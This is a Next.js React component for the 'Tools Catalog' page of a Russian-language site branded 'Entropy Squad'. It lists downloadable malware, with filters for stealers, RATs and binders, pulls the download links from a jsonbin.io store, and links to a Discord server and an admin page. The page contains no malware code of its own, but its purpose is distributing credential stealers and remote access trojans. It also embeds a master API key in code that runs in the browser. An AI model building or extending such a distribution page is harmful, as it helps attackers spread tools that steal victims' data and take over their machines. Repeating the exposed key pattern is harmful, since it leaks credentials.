"use client";

import { useState, useEffect } from 'react';
import Link from 'next/link';

const BIN_ID = "6a050660250b1311c348162d";
const API_KEY = "$2a$10$oHU2FwqpVRMsaa22tSabt.3rDdfQjyTwnpbSF25DCpfeVG9.AuX8W";

export default function Catalog() {
  const [searchQuery, setSearchQuery] = useState('');
  const [activeFilter, setActiveFilter] = useState('all');
  const [isVisible, setIsVisible] = useState(false);
  const [tools, setTools] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [downloadingId, setDownloadingId] = useState<number | null>(null);

  useEffect(() => {
    setIsVisible(true);
    fetchTools();
  }, []);

  const fetchTools = async () => {
    try {
      const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
        headers: { 'X-Master-Key': API_KEY }
      });
      const data = await res.json();
      setTools(data.record.tools || []);
    } catch (e) {
      console.error("Ошибка загрузки:", e);
    } finally {
      setLoading(false);
    }
  };

  const handleDownload = (tool: any) => {
    if (!tool.link) {
      alert("Ссылка на скачивание отсутствует");
      return;
    }
    setDownloadingId(tool.id);
    setTimeout(() => setDownloadingId(null), 1000);
    window.open(tool.link, '_blank', 'noopener,noreferrer');
  };

  const filteredTools = tools.filter((tool: any) => {
    const matchesSearch = tool.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
                          tool.desc.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesFilter = activeFilter === 'all' || tool.category === activeFilter;
    return matchesSearch && matchesFilter;
  });

  const getCategoryLabel = (cat: string) => {
    switch(cat) {
      case 'stealer': return 'СТИЛЕР';
      case 'rat': return 'РАТ';
      case 'binder': return 'БИНДЕР';
      default: return cat.toUpperCase();
    }
  };

  return (
    <div className="min-h-screen bg-black text-white overflow-hidden relative selection:bg-blue-500">
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute top-[-10%] left-[-10%] w-[120%] h-[120%] bg-[radial-gradient(circle_at_center,rgba(59,130,246,0.15),transparent_70%)] animate-pulse" />
        <div className="absolute inset-0 bg-[radial-gradient(circle_at_top,#3B82FF11,transparent_50%)]" />
      </div>

      <nav className="relative z-10 flex items-center justify-between px-8 py-6 border-b border-white/10 backdrop-blur-xl">
        <Link href="/" className="flex items-center gap-4 text-2xl font-bold tracking-[0.3em] text-blue-400 drop-shadow-[0_0_12px_rgba(59,130,246,0.9)] hover:text-blue-300 transition-all">
          <div className="w-12 h-12 rounded-2xl overflow-hidden border border-blue-400/30 bg-black flex items-center justify-center shadow-[0_0_25px_rgba(59,130,246,0.45)]">
            <span className="text-blue-400 font-black">E_S</span>
          </div>
          ENTROPY SQUAD
        </Link>
        <div className="flex gap-4">
          <Link href="/" className="px-5 py-2 rounded-2xl border border-zinc-500/40 bg-white/5 hover:bg-white/10 transition-all">← НАЗАД</Link>
          <a href="https://discord.gg/vC3Pvn9Vfw" target="_blank" rel="noopener noreferrer" className="px-5 py-2 rounded-2xl border border-blue-500/40 bg-blue-500/10 hover:bg-blue-500/20 transition-all shadow-[0_0_20px_rgba(59,130,246,0.35)]">JOIN DISCORD</a>
          <Link href="/admin" className="px-5 py-2 rounded-2xl border border-green-500/40 bg-green-500/10 hover:bg-green-500/20 transition-all shadow-[0_0_20px_rgba(34,197,94,0.2)]">ADMIN</Link>
        </div>
      </nav>

      <section className={`relative z-10 px-8 py-16 max-w-7xl mx-auto transition-all duration-1000 ${isVisible ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-10'}`}>
        <div className="mb-14 text-center">
          <h3 className="text-5xl md:text-7xl font-black tracking-[0.15em] text-blue-400 drop-shadow-[0_0_20px_rgba(59,130,246,0.8)]">TOOLS CATALOG</h3>
          <p className="text-zinc-500 mt-4 tracking-wider">Выберите инструмент для ваших задач</p>
        </div>

        <div className="mb-8">
          <input type="text" value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} placeholder="🔍 Поиск по названию или описанию..." className="w-full bg-white/5 border border-white/10 rounded-xl px-5 py-4 outline-none focus:border-blue-500 text-white placeholder-zinc-500 text-lg transition-all" />
        </div>

        <div className="flex gap-3 flex-wrap mb-12">
          {[
            { key: 'all', label: 'ВСЕ' },
            { key: 'stealer', label: 'СТИЛЕРЫ' },
            { key: 'rat', label: 'РАТКИ' },
            { key: 'binder', label: 'БИНДЕРЫ' },
          ].map((filter) => (
            <button key={filter.key} onClick={() => setActiveFilter(filter.key)}
              className={`px-6 py-3 rounded-xl font-bold tracking-wider transition-all ${
                activeFilter === filter.key
                  ? 'bg-blue-600 text-white shadow-[0_0_25px_rgba(37,99,235,0.6)] scale-105'
                  : 'bg-white/5 border border-white/10 text-zinc-400 hover:bg-white/10 hover:text-zinc-200'
              }`}>{filter.label}</button>
          ))}
        </div>

        {loading ? (
          <div className="text-center py-20 text-zinc-500">
            <div className="text-4xl mb-4 animate-pulse">⏳</div>
            <p className="text-xl">ЗАГРУЗКА ИНСТРУМЕНТОВ...</p>
          </div>
        ) : (
          <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
            {filteredTools.length > 0 ? filteredTools.map((tool: any, index: number) => (
              <div key={tool.id}
                className={`group relative p-8 rounded-3xl border border-blue-500/20 bg-gradient-to-b from-blue-500/10 to-black hover:scale-[1.02] transition-all duration-500 overflow-hidden ${
                  isVisible ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-10'
                }`}
                style={{ transitionDelay: `${index * 100}ms` }}
              >
                <div className="absolute inset-0 opacity-20 bg-[radial-gradient(circle,#3B82FF,transparent_70%)] group-hover:opacity-40 transition-opacity" />
                <div className="relative z-10">
                  <div className="flex items-center justify-between mb-2">
                    <div className="text-2xl font-black tracking-widest text-white">{tool.name}</div>
                    <span className={`text-xs px-3 py-1 rounded-full uppercase tracking-wider ${
                      tool.category === 'stealer' ? 'bg-red-500/20 text-red-400 border border-red-500/30' :
                      tool.category === 'rat' ? 'bg-purple-500/20 text-purple-400 border border-purple-500/30' :
                      'bg-green-500/20 text-green-400 border border-green-500/30'
                    }`}>{getCategoryLabel(tool.category)}</span>
                  </div>
                  <p className="text-zinc-400 leading-relaxed mb-6 mt-4">{tool.desc}</p>
                  <button
                    onClick={() => handleDownload(tool)}
                    disabled={downloadingId === tool.id}
                    className={`px-6 py-3 rounded-xl font-semibold tracking-wider transition-all ${
                      tool.link
                        ? 'bg-blue-500/20 border border-blue-400/30 hover:bg-blue-500/30 cursor-pointer'
                        : 'bg-zinc-800/50 border border-zinc-700/30 text-zinc-500 cursor-not-allowed'
                    }`}
                  >
                    {downloadingId === tool.id ? 'ОТКРЫВАЕМ...' : tool.link ? 'СКАЧАТЬ' : 'НЕТ ССЫЛКИ'}
                  </button>
                </div>
              </div>
            )) : (
              <div className="col-span-full text-center py-20 text-zinc-500">
                <div className="text-6xl mb-6">🔍</div>
                <p className="text-3xl font-bold mb-2">НИЧЕГО НЕ НАЙДЕНО</p>
                <p className="text-zinc-600">Попробуй изменить поиск или фильтр</p>
              </div>
            )}
          </div>
        )}
      </section>

      <footer className="relative z-10 border-t border-white/10 py-8 text-center text-zinc-500 tracking-[0.3em] text-sm">ENTROPY SQUAD © 2026</footer>
    </div>
  );
}